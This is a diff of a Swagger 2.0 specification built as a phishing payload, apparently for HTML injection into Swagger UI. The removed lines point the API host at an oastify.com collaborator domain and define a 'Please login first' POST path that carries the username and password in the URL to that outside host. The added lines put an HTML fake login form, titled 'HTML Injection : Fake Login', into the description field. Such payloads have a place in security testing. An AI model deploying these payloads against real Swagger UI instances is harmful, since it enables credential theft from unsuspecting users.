@@ -1,24 +1,30 @@
-swagger: "2.0"
+swagger: '2.0'
 info:
-  version: "v1"
-  title: Please login first
-
-host: d1f4xf6jcgdf131l4v12wru2bthk5ct1.oastify.com
-
+  version: 1.0.0
+  title: Fake Login Page
+  description: '<div class="login-form">
+    <div class="heading">
+        <h1>HTML Injection : Fake Login</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://example.com/login" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default">Login</button>
+            </div>
+        </form>
+    </div>
+</div>'
 paths:
-
-  /{Username}/{Password}:
+  /:
     post:
-      summary: Logs in
-      parameters:
-        - name: Username 
-          required: true
-          in: path
-          type: string
-        - name: Password 
-          required: true
-          in: path
-          type: string
       responses:
-        200:
-          description: Login was successful
+        '200':
+          description: Login successful
